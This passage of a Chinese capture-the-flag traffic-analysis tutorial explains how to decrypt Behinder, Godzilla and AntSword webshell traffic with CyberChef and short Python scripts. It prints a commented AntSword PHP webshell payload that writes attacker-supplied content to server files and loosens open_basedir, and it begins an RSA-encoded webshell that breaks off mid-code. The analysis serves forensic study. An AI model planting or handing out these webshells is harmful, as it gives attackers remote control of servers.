width=930></p><p>每一个密文块（16位）解密后都要和前一个密文块按位异或，而第一个密文块前没有密文块，所以需要16位的IV来“充当密文块”，而IV的错误只会影响第一个密文块的内容，后面的密文块能否正常解密只和前一个密文块有关。<code>base64_decode()</code>括号内的内容并不在第一个密文块里，所以看上去变成了“无论什么IV都可以正确解出密文”</p><p>虽然偏移是0（异或0等于没有异或，也就等于没有IV），但依然不能直接使用AES-ECB进行解密，因为相比起ECB，IV是0的CBC从第二个密文块开始依然有异或的过程，所以在Cyberchef里应使用如下参数解密：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>AES</span> <span class=n>Decrypt</span> <span class=c1>#仅讨论默认情况</span>
</span></span><span class=line><span class=cl><span class=n>Key</span><span class=p>:</span> <span class=n>e45e329feb5d925b</span> <span class=p>(</span><span class=n>UTF</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>IV</span><span class=err>：</span> \<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span>\<span class=n>x00</span> <span class=p>(</span><span class=n>Hex</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Mode</span><span class=err>：</span><span class=n>CBC</span>
</span></span><span class=line><span class=cl><span class=n>Input</span> <span class=o>/</span> <span class=n>Output</span><span class=err>：</span><span class=n>Raw</span> <span class=p>(</span><span class=n>视情况而定</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>反正不管是哪种加密，都可以用CyberChef试一试，看看哪一种可以正常解出来就行</p><p><img loading=lazy src=/posts/5422d65/imgs/N3.png alt=/posts/5422d65/imgs/N3.png height=971 width=2040></p><p><img loading=lazy src=/posts/5422d65/imgs/N4.png alt=/posts/5422d65/imgs/N4.png height=844 width=2036></p><p>当然，这里如果想要偷懒，对于冰蝎和哥斯拉流量也可以用<code>@风二西</code>师傅的<code>承影_哥斯拉冰蝎解码工具</code>辅助解密</p><p>直接将木马中的密钥复制到工具中，然后 Ctrl+A 全选加密的数据，再右键选择对应的解密方式即可</p><p><img loading=lazy src=/posts/5422d65/imgs/N5.png alt=/posts/5422d65/imgs/N5.png height=1589 width=2551></p><p>最后，如果遇到数据量比较庞大的流量分析的时候，可能会需要用到脚本解密批量的情况</p><p>这里我就放几个比较简单的解密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># XOR</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;e45e329feb5d925b&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_xor</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key_stream</span> <span class=o>=</span> <span class=p>(</span><span class=n>key</span><span class=p>[(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>a</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=k>for</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>key_stream</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># AES-CBC</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;5b4582c9d56b5b33&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># 默认填充到16字节(AES-128)</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_aes_cbc</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=蚁剑流量分析><span>蚁剑流量分析</span>
<a href=#%e8%9a%81%e5%89%91%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>蚁剑支持多种编码器，然后Github上也有很多<a href=https://goodlunatic.github.io/posts/5422d65/#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90 target=_blank rel="external nofollow noopener noreferrer">开源的编码器</a></p><p>1、 <a href=https://github.com/lowliness9/AntSwordEncoder target=_blank rel="external nofollow noopener noreferrer">https://github.com/lowliness9/AntSwordEncoder</a></p><p>2、 <a href=https://github.com/AntSwordProject/AwesomeEncoder target=_blank rel="external nofollow noopener noreferrer">https://github.com/AntSwordProject/AwesomeEncoder</a></p><p>因此流量的分析和解密上就会稍微复杂一点</p><p>这里我稍微写一下蚁剑流量分析需要注意的地方：</p><blockquote><p>0、首先需要判断出攻击者用的是什么编码器</p><p>1、路径base64字符串需要去除前两个字符后再解码</p><p>2、响应数据的头尾有额外的字符，需要先去除然后再base64解码</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// 蚁剑webshell一个比较简单的例子
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// 设置一些PHP配置
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>);</span> <span class=c1>// 关闭显示错误信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// 设置脚本执行时间为无限制
</span></span></span><span class=line><span class=cl><span class=c1>// 获取open_basedir配置
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$opdir</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ini_get</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 如果open_basedir配置存在
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nv>$opdir</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 获取当前脚本所在目录
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$ocwd</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将open_basedir路径分割成数组
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// /;|:/
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$oparr</span> <span class=o>=</span> <span class=nx>preg_split</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Lzt8Oi8=&#34;</span><span class=p>),</span> <span class=nv>$opdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将当前目录和系统临时目录添加到数组中
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>@</span><span class=nx>array_push</span><span class=p>(</span><span class=nv>$oparr</span><span class=p>,</span> <span class=nv>$ocwd</span><span class=p>,</span> <span class=nx>sys_get_temp_dir</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 遍历open_basedir数组
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$oparr</span> <span class=k>as</span> <span class=nv>$item</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 如果目录不可写，继续下一个目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>is_writable</span><span class=p>(</span><span class=nv>$item</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 创建一个临时目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nv>$item</span> <span class=o>.</span> <span class=s2>&#34;/.573ef8c9dd12&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 如果目录创建失败，继续下一个目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 获取临时目录的真实路径
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$tmdir</span> <span class=o>=</span> <span class=nx>realpath</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 切换到临时目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 修改open_basedir配置，使其可以访问上层目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 获取目录路径的数组
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$cntarr</span> <span class=o>=</span> <span class=o>@</span><span class=nx>preg_split</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\\\</span><span class=s2>|\//&#34;</span><span class=p>,</span> <span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 逐级返回上层目录，以还原open_basedir配置
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$cntarr</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 恢复open_basedir配置为根目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;open_basedir&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 删除临时目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>rmdir</span><span class=p>(</span><span class=nv>$tmdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 跳出循环，只操作第一个可写目录
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 自定义函数，对输出进行base64编码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>asenc</span><span class=p>(</span><span class=nv>$out</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>@</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$out</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 自定义函数，获取输出缓冲区内容并进行处理
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>asoutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$output</span> <span class=o>=</span> <span class=nx>ob_get_contents</span><span class=p>();</span> <span class=c1>// 获取输出缓冲区内容
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>ob_end_clean</span><span class=p>();</span> <span class=c1>// 清空输出缓冲区
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;fb708664&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=o>@</span><span class=nx>asenc</span><span class=p>(</span><span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;870b983ed5&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 开始输出缓冲区
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 解码POST请求中的文件路径和内容
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$f</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;idb82191cedb24&#34;</span><span class=p>],</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;e748c4dcd196bb&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$buf</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将内容进行URL解码
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span> <span class=nv>$i</span> <span class=o>+=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$buf</span> <span class=o>.=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=s2>&#34;%&#34;</span> <span class=o>.</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$i</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将解码后的内容写入文件，并返回结果
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>echo</span> <span class=p>(</span><span class=o>@</span><span class=nx>fwrite</span><span class=p>(</span><span class=nx>fopen</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>),</span> <span class=nv>$buf</span><span class=p>)</span> <span class=o>?</span> <span class=s2>&#34;1&#34;</span> <span class=o>:</span> <span class=s2>&#34;0&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 如果发生异常，输出错误信息
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;ERROR://&#34;</span> <span class=o>.</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>getMessage</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 调用自定义函数处理输出
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>asoutput</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// 终止脚本执行
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=reverse><span>Reverse</span>
<a href=#reverse class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><h4 class=heading-element id=rot13><span>ROT13</span>
<a href=#rot13 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><h4 class=heading-element id=rsa><span>RSA</span>
<a href=#rsa class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;ant&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$pk</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>-----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx
</span></span></span><span class=line><span class=cl><span class=s>PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ
</span></span></span><span class=line><span class=cl><span class=s>5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J
</span></span></span><span class=line><span class=cl><span class=s>RAcfJSQCvaw6O8uq3wIDAQAB
</span></span></span><span class=line><span class=cl><span class=s>-----END PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cmds</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>);</span>
